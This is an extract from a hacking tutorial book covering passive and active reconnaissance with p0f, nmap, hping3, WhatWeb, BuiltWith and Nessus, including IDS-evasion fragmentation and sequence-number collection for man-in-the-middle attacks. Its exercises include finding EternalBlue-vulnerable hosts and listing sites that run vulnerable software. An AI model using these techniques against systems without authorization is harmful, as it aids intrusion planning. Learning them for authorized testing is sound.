---
title: Getting Started Becoming a Master Hacker_ Hacking is the - Part 2
source: Getting Started Becoming a Master Hacker_ Hacking is the.md
category: development
---

attributes of a master hacker.
As a hacker, it is often critical to know what antivirus software the target is
running. Unless you have created or bought a zero-day exploit, it will likely
be detected and quarantined by the antivirus software.
As a result, your days, weeks, or months of work will be lost.
Not all antivirus software isthe same! Some are good, and some are bad.
Some detect certain malware, and some detect others. As a result, an attack
may work against one antivirus and not against another. If we can know
ahead of time what antivirus the target is using, we can tailor an attack that
evades that software.
When firms have their own DNS server, that server caches every DNS
query from every employee. If we can examine the DNS cache, we can see
every domain that has been queried. This means if we can
examine the DNS cache, we can determine which AV software domain
(Symantec, McAfee, Kaspersky,
etc.) has been queried and which has not. The target company will be using
one or all of the AV domains in the list. We don't know which, but we do
know that AV companies not on the list are NOT being used.
That information alone can help us determine which attack works.
As this is more of an intermediate-to-advanced reconnaissance technique, I
will simply leave you with a link where you can learn more
(https://www.hackers-arise.com/single-post/2016/05/23/How-to-Use-
Reconng-to-Determine-the-Targets-AV-Software-1).
70 | P a g e
Summar y

## Page 179

The DNS system can be a repository of a significant amount of information
about a target, including the nameserver, mail server, and many
subdomains. Many of these subdomains may not be obvious, and the target
company may believe that they are unviewable because there are no links to
them. Very often, these subdomains may contain confidential and valuable
information to the hacker.
p0F or Passive Operating System Detection
As part of the reconnaissance of our targets, one of the most critical pieces
of information we need is the target operating system. I hope it is apparent
that a MacOS exploit does not work against a Windows system and vice
versa. What may not be obvious is that a Windows Vista exploit may not
work against a Windows 7 system. In many cases, a Windows 7 SP1 exploit
may not work against a Windows 7 SP2.
The point I am trying to make is that knowing the operating system of the
target is critical to our success.
Without this information, we are likely wasting our time and effort.
In this lesson, we look at a tool known as p0f. The name is an acronym for
passive operating system fingerprinting.p0F relies upon an understanding of
how each of the operating system TCP/IP stacks implement and build their
packets to determine the OS of the sender. In this way, it is totally passive.
We don't need to touch the target system with packets or anything else. This
tool enables us to determine the target operating system without sending
any packets or probes to the target.
TCP/IP Basics
There are many ways to determine the operating system of a target. For
instance, specific ports and services are only open on Windows systems
(1433 for SQL Server and 137 for NetBios) and some ports only on Linux
systems (631 for IPP). This kind of fingerprinting will at least divide the
world into those two broad camps (Windows v. Linux), but it is a pretty
limited method. First, some Windows systems don't have those ports (1433
and 137) open, and some Linux systems don't have that port (631) open.

## Page 180

Second, sometimes knowing the broad camp of the OS is not enough
information. We need a more
refined understanding of the OS version, sometimes down to the service
pack (SP) level.
Some tools throw many probes at the system and then gauge the response to
determine the operating system. These tools are very noisy and not very
stealthy, but in general, work well if their fingerprints are up-to-date. What
if we wanted to determine the OS without ever touching the system and
risking being detected? Can we do that?
The answer is a definitive “Yes”! A few years back, Michal Zalewski
developed the tool p0F or the passive operating system fingerprinting.
p0F and other passive fingerprinting tools rely upon the fact that different
operating systems have different TCP/IP stacks and therefore create these
packets slightly differently. This means that we can take any packet
traveling around the Internet and if we know what we are looking for,
determine what operating system sent it.
The four critical fields of the TCP/IP headers that are crucial for OS
identification are:
71 | P a g e

## Page 181

• TOS
• TTL
• DF (flags)
• Window size
In the diagram below, I have circled these fields in the IP header (TOS,
TTL, and DF) and theTCP header (Window Size).
Let’s take a look at each of these fields.
First, the Type of Service in the IP header or TOS . That field can have four
(4) different values:
• Minimize Delay
• Maximize Throughput
• Maximize Reliability
• Minimize Monetary Cost

## Page 182

Second, the Flags field. This field shouldn't be confused with the TCP flags
(S,A,F,U,P,R). The TCP
stack sets this field as either D or M, don't fragment or more fragments.
This is the way that the IP
protocol signals to the receiver whether more packet fragments are on the
way. If it gets packets with the M flag set, the receiver can hold the packets
and reassemble them into a complete packet.
Third, TTL or Time to Live. This field indicates how many hops the packet
should make before it expires. Windows systems usually have this set to 32
and Linux systems to 64, although it does vary.
Finally, let's examine window or window size. This field defines how
much buffer the TCP stack has to buffer packets. Remember that one of the
beauties of TCP is that it has "flow control .” If one side is sending packets
too quickly for the other to process, the sender can buffer the packets.
Window size defines the size of that buffer. This field alone carries more
information about the identity of the sender than any other field in either
header. Nearly every operating system has a different window size.
Now that we understand what p0f does, let's put it to work on some packets.
72 | P a g e

## Page 183


## Page 184

p0 F
p0F is pre-installed in Kali, so no need to download and install it. p0F is not
available from the GUI in Kali, but it is built-in and isaccessed via the
command line. Since its binaries (executable files) are in the
/usr/bin directory and /usr/bin is in our PATH variable, we can access it
from the command line from anywhere in Kali. Let's take a look at its help
file by typing (please note that the middle character is the number zero 0,
not the letter o):
kali> p0f -h
As you can see above, p0f has a brief, but complete help file. The first
stanza addresses the network interface options, the second stanza the

## Page 185

operating mode, and the third stanza the performance options.
In its simplest form, you can run p0f by simply typing the command
followed by an -i (interface) and then the name of the interface you want
p0f to listen on—in this case—eth0:
kali> p0f -i eth0
When we start p0f , it begins listening on the designated interface and then
decoding the information from each packet as they appear.
Let's try navigating to our Kali system (you may want to start the Apache
web server) from our Windows 7 system with a Firefox browser.
73 | P a g e

## Page 186


## Page 187

As you can see, at first p0f opens, then loads 320 signatures, listens on eth0,
and then enters the main event loop. When it sees a packet at the interface,
it begins to decode it. First, it tells us what IP address and port it is coming
from and the TCP flag that is set (SYN). Next, it tells us what OS fits the
fingerprint for this packet (Windows 7 or 8). In the next stanza, it tells us
what the link is (Ethernet or modem) as well as the MTU (1500).
If we scroll down a bit, we see the information above describing the
browser we used (Firefox 10.x or newer), the language (English) and its
raw signature.
From the same system, if we use Microsoft's Internet Explorer 9 to send
packets to our Kali, you can see that p0f fingerprints the browser as "MSIE
8 or newer."
74 | P a g e

## Page 188


## Page 189

Let’s try sending packets from another Kali system. Kali is built on Debian
Linux with a Linux kernel.
Depending upon what version of Kali you are running, the kernel is either
3.12 or 3.14. If p0f is accurate, it should be able to fingerprint this packet as
coming from a Linux system.
As you can see in the screenshot above, p0f was able to determine that the
OS was “Linux 3.11 and newer.” Pretty accurate, wouldn’t you say?
p0F can also determine the uptime of the target system. This can be key in
determining how long it has been since the system admins patched the
target system (security patches usually require a reboot of the system). If we
scan down the output from the Kali decoding, we can see that p0f has
determined that the system has been up 6 days, 16 hours and 16 minutes.
Very helpful information!
75 | P a g e
Summar y
Before beginning the attack, it is crucial to learn as much as possible about
the target to increase the chance of success. There are numerous tools we
can use to gain information without ever contacting the target from sources
that have previously collected this information. These are known as passive
reconnaissance techniques or sometimes referred to as open source
intelligence (OSINT). Google,
Netcraft, Shodan, DNS all have valuable information that can assist in
tailoring your attack. A tool like p0F is capable of determining the target

## Page 190

operating system, browser, user agent and uptime, if we can entice the
target to our website. All of this information will be critical in determining
which approach will most likely be successful in our attack.
Exercises:
1. Use Shodan.io to find Windows Server 2008 systems that
might be vulnerable to the NSA’s EternalBlue exploit.
2. Use dnsenum to find the nameserver, mail server and
subdomains of your favorite website.
3. Try using p0f to determine the operating system and other
information of someone visiting your website.
4. Look up the technologies used by your favorite website
with netcraft.com.
5. Try out some of the Google6
Hacks at exploit-db.com and
see whether you can find any valuable information.
76 | P a g e

## Page 191

6
Active Reconnaissance
Only a fool goes to battle without adequate reconnaissance
Master OTW
In the Chapter 5 on passive reconnaissance, we
gathered vast amounts of information about
potential targets . In this next phase of reconnaissance, we use
active techniques to acquire even more information about a specific
target.
In the active reconnaissance phase, we try to determine what ports are open
on the target (open ports are an indication of services running on the
system, such as port 445 for SMB) and the firewall. In some 77 | P a g e
cases, certain ports must be open for an exploit to work on a system. In
addition, by scanning the ports we can not only determine what ports are

## Page 192

open, closed, and filtered (a firewall is filtering), but often determine the
operating system (ports 135, 139, and 1433 almost invariably indicate a
Windows operating system, for instance) and the applications on the system
(ports 1433, SQL Server; port 3306, MySQL; port 1521, Oracle database;
for example).
Active reconnaissance uses specially crafted packets that we send to the
target to illicit a response.
Depending upon how the target responds, our tools can determine:
1. Whether a port is open, closed or filtered;
2. Which services and what version is installed;
3. What operating system is installed;
4. The time since the last reboot (uptime).
Nmap
Whether you are an aspiring master hacker, network engineer, or security
engineer, there is one tool you need to be familiar with:nmap. Nmap began
as a simple, modest port-scanning tool with the ability to send TCP, UDP, or
ICMP packets to a host and its ports to elicit a response. Then, based upon
the host’s response, nmap determines whether the port is open. Over the
years, it has evolved to become a powerful scanning tool with even some
exploitation capabilities. For instance, nmap can be used for:
(1) OS detection,
(2) service and version detection,
(3) determining the OS uptime,
(4) evading firewalls,
(5) doing DNS queries and subdomain search,

## Page 193

(6) conducting a Denial of Service (DoS) attack, or
(7) scanning for vulnerabilities and a whole host of other reconnaissance
tasks.
Nmap in the Mass Media
Matrix fans (who isn't a Matrix fan?) may remember in Matrix Reloaded
that Trinity used to find TCP
Port 22 open on the power plant's computer system (SCADA) and crack the
password to give Neo
physical access.
Yes, that's our beloved nmap below in a scene from the Matrix Reloaded
with Trinity at the keyboard.
78 | P a g e
You will likely find nmap being used in other hacker movies and shows,
such as Mr. Robot and Blackhat among others, if you watch closely.

## Page 194

Many infosec researchers have overlooked nmap in favor of more recent
tools, but only at their peril.
Nmap has become a versatile reconnaissance tool with scripting
capabilities.
History of Nmap
Nmap was developed in 1997 and released by Gordon Lyon (aka Fyodor
Vaskovich) as a free and open-source port and network scanner in Phrack
magazine ( Phrack was among the very first hacker publications and many
notable articles were first published there). Nmap has gone through
numerous updates and upgrades with the current version 7.7 (Fall 2019)
having been released about one year ago.
Originally developed for Linux, nmap has been ported to Windows,
MacOS, and BSD.
Nmap was originally a command-line tool, but numerous GUI's have been
developed for use by the
command-line challenged. These include:
(1) Zenmap;
(2) NmapFE;
(3) Xnmap
Here, we will work without a net. Everything will be from the command
line nmap, but all of these techniques can be applied to any of the nmap
GUI's.
Nmap help
Let's look at the nmap help file for some clues on how to use it.
kali > nmap –help

## Page 195

79 | P a g e
The help screen runs for nearly three pages. I have captured only the first
page, as it has the essential information we need here now.
Notice the usage statement on the second line:
Usage: nmap [Scan type(s)] [Options] {target specification}
Despite all the options that are available to us, running an nmap scan is
quite simple.
Basic TCP Scan
Let's use Metasploitable as our target system to start. The first step is to find
the IP address of our target.

## Page 196

In this case, it is 192.168.0.157 (yours will likely be different. Run ifconfig
on Metasploitable to find yours).
The simplest, fastest and most reliable nmap scan is the TCP scan. It sends
TCP packets to attempt a TCP
three-way handshake (SYN-SYN/ACK-ACK) on each port it scans. If the
target system completes the
three-way handshake, the port is considered open. The key nmap option is -
sT or s can T CP.
We simply add it as an option after the nmap command and then follow
with the IP address.
nmap -sT <IP>
Such as:
kali > nmap -sT 192.168.0.157
80 | P a g e

## Page 197

After a few seconds, nmap provides output to the computer screen (stdout)
that includes each port it has results for, the protocol, the port state (open,
closed, filtered) and the default service running on this port (please note
that nmap is NOT telling you what service is running on the port; it is
simply telling you the defaul t protocol for that port. Most services can run
on any port). From this scan, we can see that numerous ports and services
are likely running on this system (like any tool, nmap is not perfect. You
may receive erroneous reports).
This is a great start to our reconnaissance of this system. We now know the
target has numerous services that may be vulnerable to our attacks.
What we do NOT know include:

## Page 198

(1) What UDP ports are running;
(2) What operating system is running;
(3) What actual services and versions are running on those ports.
Basic UDP Scan
Now, let's see if we can find the open UDP ports. The nmap command to
find UDP ports is nearly
identical, except we replace the T in the command with U (UDP).
81 | P a g e
Now our UDP scan looks so:
kali > nmap -sU 192.168.0.157
Generally, UDP scans take much longer than TCP scans, as the mechanism
that UDP uses for signaling a closed port is slightly different than TCP, and
is more ambiguous. In my case, the TCP scan took 13.61
seconds, while the UDP scan took 1089.42 seconds, a factor of nearly 100x
longer .
Be patient with UDP.

## Page 199

Single Port Scan
In some cases, we may only want to know if a single port is open. For
instance, we may be considering using the EternalBlue exploit against this
system and we 445. Let's see whether this system has port 445
open by simply adding -p after the target IP address and the port number.
Note that SMB is a TCP port, so we use the TCP or –sT scan.
Such as:
kali > nmap -sT 192.168.0.157 - p445
82 | P a g e

## Page 200

This command directs nmap to go out and try the three-way TCP handshake
on port 445. If successful, it will report the port open. As you can see above,
nmap found port 445 open and presumes there is SMB
(Samba if it’s a Linux system) running on that port.

## Page 201

If we wanted to scan an entire subnet for port 445 and SMB, you could use
CIDR notation for the subnet and leave everything else the same as the
previous command.
kali > nmap -sT 192.168.0.0/24 -p445
83 | P a g e
Now, nmap will scan every device on that subnet (255 IPs) for port 445 and
report back to us. As you can see above, it found numerous hosts with port
445—some closed, some filtered, and some open.
Get the OS, the Services and their Versions
At this point, we only know what UDP and TCP ports are open and the
default protocols that run on them. We still don't know:
1. The operating system,

## Page 202

2. The actual services running on those ports, and
3. The version of the services (different versions have different
vulnerabilities).
The -A switch in nmap can help us with those remaining unknowns.
Such as;
kali > nmap -sT -A 192.168.0.157
This scan also takes longer to complete as it has much more work to do than
simply scan for open ports—
a very deterministic process. In this scan, nmap will be probing into each
open port with specially crafted packets and then, by evaluating the
differences in the response, determine the service and its version. It uses a
similar less-deterministic process for determining the operating system. As I
outlined in Chapter 5
on p0f , each operating system TCP/IP stack places slightly different values
in header fields. By reading those fields, we can make highly accurate
estimate of the underlying target operating system.
84 | P a g e

## Page 203

As we can see above, nmap went to each of the open ports, sent packet
probes and makes a highly
reliable estimate of the service, the service version and other critical
information regarding the service, such as commands and even
vulnerabilities. Note the response for port 21 FTP above (running vsftpd
2.3.4) and port 25 SMTP (running Postfix smtpd).
As we scan down the results, we can see port 80 (running Apache httpd
2.2.8), port 3306 (running MySQL 5.0.51a)...
...and then all the way at near the bottom we can see nmap's estimate of the
underlying operation system (Linux 2.6.x).
Nmap Scan Windows 7
Now let’s use nmap to scan our Windows 7 system to see what ports are
open on it. Let’s use the TCP
scan (-sT) with service and operating system (-A) fingerprinting.
kali > nmap –sT –A 192.168.0.114

## Page 204

85 | P a g e
Note that nmap found numerous ports open on my Windows 7 system. For
our purposes here, the most important findings are port 445 with SMB
running (microsoft-ds) and it correctly identified the operating system as
Windows 7| 2008 | 8.1 (those are all operating system variations of the same
build by
Microsoft). My system has some ports open that yours may not. That is to
be expected.
Wrap-Up
With just a few nmap commands, we were able to learn a great amount
about the devices on our network, including:
1. TCP ports,
2. UDP ports,
3. Whether port 445 is open on our entire network,

## Page 205

4. The operating system of the target,
5. Which services and their versions are running on those ports.
Pretty good for little work or knowledge!
Hping3 for Active Reconnaissance
Previously, we used the ubiquitous and powerful nmap for port scanning in
this active reconnaissance stage of our pentest/hack. Although lesser-known
and lesser-utilized, hping3 is a powerful and versatile scanning tool for
doing active reconnaissance. In this section, we will explore some of the
wide-ranging capabilities of hping3 to find key information about our target
that could prove useful at later stages.
Hping3 is often referred to as a “packet crafting tool .” That’s because it has
the capability of creating just about any type of packet , both RFC (Request
for Comment. These are the specifications of how protocols are supposed to
work) compliant and non-RFC compliant. If you can imagine a packet,
hping3 can create it!
86 | P a g e

## Page 206

Hping3 can create TCP, UDP, ICMP, and RAW IP packets. This enables us
to create an almost infinite variety of packets that we can use to get past
IDSs, firewalls and scan systems behind them.
Unlike nmap, though, hping3 requires a bit more user input to be effective.
For instance, when we scan with nmap, nmap will interpret the results for
us. On the other hand, hping3 will give us raw packet responses and we
need to do the interpretation ourselves. This is probably one of the primary
reasons hping3 is not as popular as nmap for scanning, but its versatility
makes it a valuable tool to have in the active reconnaissance toolbox.
Hping3 Help

## Page 207

Let’s begin by getting the help screen for hping3. We can do this by typing;
kali > hping3 -h
When we do so, hping3 responds with along screen of options and switches.
Because of the length, I have broken it into two screenshots.
As you can see in the screenshot above, there are numerous switch options
with hping3 and this is just a tiny fraction. I’d like you to note of few here.
•
-c count
•
-i wait X number seconds
•
-flood flood the target with packets
87 | P a g e

## Page 208

•
-q quiet
•
-a spoof the IP address
•
-rand-source send packets with random source IP addresses

## Page 209

•
-f fragment the packets
•
-x set the more fragments flag in the IP header
•
-y set the don’t fragment flag in the IP header
Please also note that the default mode of hping3 is TCP packets. Unlike
nmap that defaults to sending an ICMP ping, which can often be blocked by
firewalls and gateways.
The screenshot above shows us even more options. I’d like to draw your
attention to the following:
•
-p destination port,
•
-Q get the TCP sequence number,
•
-tcp-timestamp gets the TCP timestamp and converts it into days, hours and
minutes.
Also note that we can set any of the TCP flags (S,A,F,P, R, U) as well as the
XMAS (-X) scan (flags P,U,F set).
88 | P a g e

## Page 210

Using Hping3 in Default Mode for Port Scannin g
At its most basic level, hping3 is a port scanner similar to nmap. The syntax
is similar, but the output is dissimilar. Unlike nmap, hping3 does not return
a consolidated output, but instead returns the
specifications of the response packet. Let’s take a look what happens when
we try to hping3 a Windows 7 system on port 80. Here, let’s use the SYN (-
S) flag. This scan is similar to the nmap -sS <IP> -p 80 scan.
kali > hping3 -S 192.168.1.116 -p 80
Use the Ctrl+C to terminate hping3.
As you can see in the sixth column, the flags field returns RA. This
indicates that the RST and ACK flags are set. The RST flag being returned
is the standard way TCP communicates that the port is closed. On this
Windows 7 system, we can then conclude that port 80 is closed. Unusual,
but not unknown.
Since this is a Windows machine, it is likely to have SMB is enabled or port
445. Let’s try that port.

## Page 211

kali > hping3 -S 192.168.1.116 -p 445
As you can see in the above screenshot, when we scan port 445 on this
system, it returns a packet with the SA flags set or SYN (S) and ACK (A)
indicating it is open.
Finally, if we want to scan all the ports, we can use the increment syntax or
++1 and form a command like this;
kali > hping3 -S 192.168.1.116 -p ++1
89 | P a g e

## Page 212

This scan starts at port 1 and increments by 1 (++1) to test each port for a
response.
Notice in the fifth column that it begins by scanning port 1, then port 2, then
port 3...It will continue to scan all 65535 ports until it reaches the end or
you hit Ctrl+C.
Fragmenting Packets
As I mentioned in the introduction on hping3, you can sometimes bypass
security devices such as IDSs and firewalls by fragmenting the packets. We
can do this with hping3 by using the -f switch such as; kali > hping3 -S -f
192.168.1.116 -p 445
Since the packet is broken into many small fragments of the original packet,
in some cases the IDS or firewall’s attack signature won’t match these
fragmented packets.
90 | P a g e

## Page 213

Predicting Sequence Number s
Sequence numbers are used by TCP/IP to make certain that packets that
don’t arrive in the proper sequence can be reordered at the target in the
same sequence they were sent. Since all packets do not necessarily take the
same path, they may not arrive in the same order they are sent. This
mechanism is an element of what gives the TCP protocol its robustness.
A Man-in-the-Middle attack (MiTM) must set these sequence numbers
properly. To protect against
MiTM attacks, operating system developers no longer use sequence
numbers that follow serially
(1,2,3…). Instead, they now use algorithms to generate sequence numbers
to make it harder to conduct a MiTM attack. Hping3 enables us to collect
the sequence numbers so that we can later predict them for MiTM and other
attacks.

## Page 214

Let’s scan google.com and gather some sequence numbers. We can do this
by using the -Q switch, which will collect and echo back only the sequence
numbers of the returned packets.
kali > hping3 -Q -S google.com -p 80
As you can see, hping3 was able to return to us the sequence numbers that
the operating system TCP/IP
stack generated. Given enough of these, we can determine the algorithm
and then predict the sequence numbers for an effective MiTM attack.
Using Hping3 to get the System Uptime
One of the really interesting things we can do with hping3 is to check how
long the system has been up and running. Generally, this means how long
it’s been since the system has been rebooted and, of course, that is usually
an indication of how long since the system has been patched with security
updates.
The TCP protocol has a field named “timestamp” that calculates the
seconds since the operating system was last booted up. We can retrieve that
value by using the “–tcp-timestamp ” switch in hping3. It will go out to the
target system and retrieve this field, and then convert it into days, hours,
minutes, and seconds. Let’s try it on google.com.
kali > hping3 –tcp-timestamp -S google.com -p 80
91 | P a g e

## Page 215

As you can see, when I ran this command against the Google server, it
returned a message that
this server’s timestamp was 858100827 and it then converted that to 9 days,
22 hours, 21
minutes, and 40 seconds.
As a hacker/pentester, this can be invaluable information! It means that this
system was last
rebooted nine days ago. If a recent patch has been released for a known
vulnerability within
those nine days, we can conclude that this system has NOT been patched
and is probably
vulnerable to that known exploit.
Website Active Reconnaissance
Nmap and hping3 are wonderful tools for actively determining critical
elements of any system such as ports, services and operating system. When
scanning websites, we need to use a different set of tools.
Websites are built using a variety of technologies (see Web Technologies
here ). In most cases, before we develop a hacking strategy of the website,
we need to understand the technologies employed in building it. Website
attacks are not generic. For instance, attacks against WordPress-based

## Page 216

websites won't work against .NET based websites and vice versa. We need
to do this type of reconnaissance first before progressing to compromising a
website.
WhatWeb is a Python script that probes the website for signatures of the
server, the CMS and other technologies used to develop the site. According
to the WhatWebweb page:
WhatWeb recognises web technologies including content management
systems (CMS), blogging platforms, statistic/analytics packages, JavaScript
libraries, web servers, and embedded devices. WhatWeb has over 1700
plugins, each to recognise something different. WhatWeb also identifies
version numbers, email addresses, account IDs, web framework modules,
SQL errors, and more.
Once we know what technologies the website is running, we can run
vulnerability scans to find known vulnerabilities and develop an attack
strategy.
92 | P a g e

## Page 217

To start, let's take a look at WhatWeb’s help screen .
kali > whatweb –h
WhatWeb displays several pages of help. We can see in this first screen that
the basic syntax to use whatweb is;
whatweb [options] <URL>
You will also notice in this first section a paragraph titled "Aggression".
Here we can select how stealthy we want to be in probing the site. The more
aggressive the scan, the more accurate it is and the more likely your scan
will be detected by the security devices and website owner.
When we scroll to the bottom of the help screen, we can see some
examples. In most cases, we can simply enter the command, whatweb,
followed by the URL of the target site.
Scanning Websites to Determine the Technologies Employed

## Page 218

Let's try scanning some websites of companies that provide information
security (infosec) training. Let's find out if they are actually securing their
sites as they teach in their courses.
Let's begin by scanning sans.org.
kali > whatweb sans.org
93 | P a g e
When we scan sans.org, we can see that they have hidden their country, use
Apache as their web server and an Incapsula Web Application Firewall
(WAF); minimal information, so they have done well!
Next, let's try the same scan on another infosec training company, Infosec
Institute’s website,
www.infosecinstitute.com.
kali > whatweb infosecinstitute.com
Our scan of www.infosecinstitute.com, reveals a bit more information, such
as their country (United States), their web server (nginx) and their CMS
(WordPress).

## Page 219

Finally, let scan the information security training site, www.cybrary.it.
kali > whatweb cybrary.it
As we can see above, www.cybrary.it's server is in the United States and
they are using Amazon Web Services (AWS), Amazon's Content Delivery
System (CDS), Cloudfront, and the CMS WordPress.
Summary
WhatWeb is an effective tool for scanning websites to learn what
technologies they are running. Unlike Netcraft, WhatWeb is an active tool
as it send probes to the website to determine what technologies are 94 | P a
g e

## Page 220

employed. One of the key advantages of WhatWeb over Netcraft is that
Netcraft only collects and
indexes the most active sites, while we can use WhatWeb against any
website at all, even the smallest.
BuiltWith Web Technologies
WhatWeb is an excellent tool for determining the technologies used in a
website, but it’s always a good idea to have multiple arrows in our hacker
quiver. The website www.builtwith.com doe s a similar task and analysis.
Some of its basic capabilities are offered for free, but to use ALL its
capabilities you need to register and pay an annual fee.
One of the key capabilities of BuiltWith is to identify ALL websites with a
particular technology.
Imagine that a new vulnerability is exposed in websites built with
WordPress v.4.9. BuiltWith is capable of providing you a list of every
website built with that technology.
Simply enter the name of the technology in “Technology Name” windows.

## Page 221

As you can see above, BuiltWith informs us that nearly eight million live
sites use WordPress 4.9.
BuiltWith to Scan for Website Technologies
To use BuiltWith,we simply enter the website we are interested in learning
about and it returns the technologies employed in the site. Below we have
entered the website cybrary.it.
95 | P a g e

## Page 222


## Page 223

BuiltWith also has excellent Firefox, Chrome, and Edge extensions that will
detail the technologies used by every website you visit with your browser.
To add the extension to your browser, navigate to
https://builtwith.com/toolbar . There, you can download and install the
appropriate extension for your browser.
Now, whenever you visit a website, you can click on the small BW icon on
the upper right corner of your browser and automatically get a readout of
the technologies employed by that site.
96 | P a g e

## Page 224

BuiltWith is an excellent tool for determining the technologies used in
websites. Both the website and the browser plugin are capable of probing
the website and returning a detailed list of the technologies used. I, for one,
use the browser plugin all the time so that I can quickly and easily know
what technologies are behind the site. BuiltWith has an additional key
capability of finding and listing every website with a particular technology.
This can be particularly useful when a new vulnerability has been found
and you need to know who is using it before it is patched.
Summary
Before moving on to advanced exploitation, we need to know as much
about the target as possible. In Chapter 5 we used passive techniques to
learn as much as we can, and in this chapter we advanced to using active
techniques. Active techniques tend to be more accurate and precise, but
carry the downside of not being stealthy.
Exercises
1. Do an nmap TCP (-sT) scan with the services switch (-A) on
another machine in your home, office or school.
2. Do a hping3 scan on the same and in addition to finding what
ports are open, find out how long it is up.

## Page 225

3. Use WhatWeb to determine the technologies used by your
favorite website
4. Use BuiltWith to do the same.
5. Find a new website vulnerabi
7
lity from securityfocus.com and
search for websites using that technology on BuiltWith.
6. Install the BuiltWith browser extension into your favorite
browser.
97 | P a g e

## Page 226

7
Finding Vulnerabilities to Exploit
Every adversary--no matter how strong and powerful--always has a
weakness
Master OTW
Now that we have a good idea of the ports, services,
operating system , and technologies from our passive and active
reconnaissance of the potential target system, our next step is to find
vulnerabilities that might be exploited by the attacker. According to
Wikipedia, a vulnerability is:
a weakness which can be exploit ed by a threat actor, such as an att acker,
to perform unauthorized actions within a computer system.
98 | P a g e

## Page 227

I like to think of a vulnerability as a window or door to the computer system
that hasn’t been properly closed or locked. If the hacker knows that this
vulnerability exists, then they can often exploit it.
What is Vulnerability Scanning?

## Page 228

Vulnerability scanning is the process of looking for known vulnerabilities.
We usually use a tool known as a vulnerability scanner, which sends probes
to operating systems, services, and applications to determine whether a
known vulnerability exists. These scanners are neither perfect nor stealthy.
Although penetration testers often use vulnerability scanners, hackers who
must remain stealthy seldom get the opportunity because these vulnerability
scanners are very “noisy” and can be easily detected.
Nevertheless, if the attacker is in a position to use a vulnerability scanner,
they can save hours, days, or weeks of work.
In addition, vulnerability scanners tend to generate a large number of false
positives (see below). It is the job of the pentester to determine whether a
potential vulnerability found by the scanner is a real vulnerability or not by
attempting to exploit it.
How Does a Vulnerability Scanner Work?
Vulnerability scanners such as Nessus, Nexpose, Qualys, and Acunetix
(there are any others) maintain databases of known vulnerabilities. These
vulnerabilities have telltale signs or signatures that the scanners can probe
to see whether they exist. For instance, the EternalBlue vulnerability that
was exploited by such ransomware as WannaCry and Petya takes advantage
of a flaw in the Windows driver file srv.sys .
The vulnerability scanner simply checks to see whether that file at
C:\Windows\system32\drivers has been updated to srv2.sys. If it has been
updated, the system is not vulnerable to the EternalBlue exploit and all the
malware that uses it.
Serv.sys on Windows 7 system
99 | P a g e
In addition, vulnerability scanners check to see whether operating systems
and applications are up to date on their patches.

## Page 229

What are False Positives?
False positives are generated when a system such as a vulnerability scanner
says something exists, but it does not. For instance, if your system
vulnerability scanner says that your system is vulnerable to EternalBlue and
it is not, that is a false positive . Unfortunately, vulnerability scanners are
far from perfect and generate a lot of false positives.
False Positive
The scanner indicates the vulnerability exists (positive) and it doesn’t exist
(false).
False Negative
The scanner indicates the vulnerability doesn’t exist (negative) and it does
exist (true).
True Positive
The scanner indicates the vulnerability exists (positive) and it does exist
(true).
True Negative
The scanner indicates the vulnerability doesn’t exist (negative) and it
doesn’t exist (true).
Although false negatives can be frustrating, given a choice between a
system that produces false positives or false negatives, we certainly prefer
the false positive.
EternalBlue nmap Vulnerability Scanner
Let’s test our Windows 7 system for the presence of the EternalBlue
vulnerability. As I mentioned earlier in Chapter 6, nmap’s capabilities have
expanded dramatically in recent years. Nmap can now run

## Page 230

specialized scripts written in Lua. One of those scripts is a EternalBlue
vulnerability scanner. Note that this script only tests for this single
vulnerability.
To run this vulnerability scanning script, we simply need to point our nmap
scanner at the IP of the Windows system and its SMB port (445) and then
include the option –script followed by the name of the script, in this case
smb-vuln-ms17-010 .
kali > nmap 192.168.0.157 –p445 –script smb-vuln-ms17-010
100 | P a g e
As you can see above, our nmap vulnerability scan indicates that our
Windows 7 system IS vulnerable to the EternalBlue exploit!
Nessus Vulnerability Scans
The nmap script used above was effective at identifying that single
vulnerability in our unpatched Windows 7 system. It was effective for that
one vulnerability, but far from comprehensive. What if we wanted or

## Page 231

needed to scan for ALL known vulnerabilities? This is exactly what a
vulnerability scanner like Nessus can do. Although there are many effective
vulnerability scanners on the market, Nessus is my favorite and the favorite
of 44 percent of security engineers
Nessus began as an open-source project by Renaud Deraison in 1998 (just
like Snort, Metasploit, and many other information security projects). In
2005, Deraison’s company, Tenable Network Security, converted this
software to proprietary and closed source. Lucky for us, it still has a free
Essentials version (formerly the Home version), which can be used
indefinitely for free for up to sixteen IP addresses.
Let’s use it to test our Windows 7 system.
Go to the Nessus page here and download the Essentials (home) version of
Nessus.
https://www.tenable.com/products/nessus/nessus-essentials
101 | P a g e

## Page 232

Click to Download the appropriate version. Since I’m using Kali throughout
this book, I downloaded the version for Debian 6,7,8/Kali Linux (as
mentioned earlier, Kali is built on Debian, just like Ubuntu).
Next, agree to the Master License.
Once Nessus has finished downloading, navigate to the Downloads
directory on your Kali system.
kali > cd /root/Downloads
In the Downloads directory, you should see your Nessus package. Now, use
the dpkg command to extract and install Nessus.
kali > dpkg –i Nessus-8.5.1-debian6_amd64.deb
Note that the version of Nessus you are downloading may be different.
Enter your version package after the –i in the dkpg command.
102 | P a g e

## Page 233

When it has completed its installing, we next need to start Nessus. We can
start it by entering: kali > /etc/init.d/nessusd start
Now, open your browser and go to https://localhost:8834. Your brow ser
may squawk at you about the connection not being secure (Nessus uses a
self-generated certificate). Ignore the warnings, make a security exception
for your Nessus server and continue.
You should be greeted by a Nessus screen like that below. At this screen
you will be creating an account on your Nessus server.
103 | P a g e

## Page 234


## Page 235


## Page 236


## Page 237

Next, you will need to enter the activation code Nessus sent you via email.
Make certain you select
“Essentials” for scanner type.
Enter your Activation Code and hit Continue. Nessus will now start to
initialize your scanner,

## Page 238

downloading plugins and the vulnerability database.
104 | P a g e

## Page 239


## Page 240


## Page 241

This can take a while. Go get your favorite beverage and wait…and then
maybe go get another.
When it has completed this initialization, login with the credentials you
entered above.
Once we sign in to Nessus, we are greeted by the “My Scans” screen. Since
we have not yet done a vulnerability scan, no scans appear here yet. You
can see a button in the upper right corner labeled “New Scan.” Click it to
start a new vulnerability scan.
105 | P a g e

## Page 242


## Page 243

This should open a screen asking you what type of scan you want to do.
Let’s select “Advanced Scan” on the top line second from the left.
This will open a screen asking you to name your scan (this is simply a
label), so I have named mine
“NewScan.” Creative, right? You are also asked for a description, a folder
and most importantly, the IP
address or addresses you want to scan. This can be a list of IP addresses or
CIDR notation of a subnet.
If there are many IP addresses, you can upload a file with IP addresses near
the bottom. Here, I will scan just my Windows 7 system on my local
network (192.168.0.102).
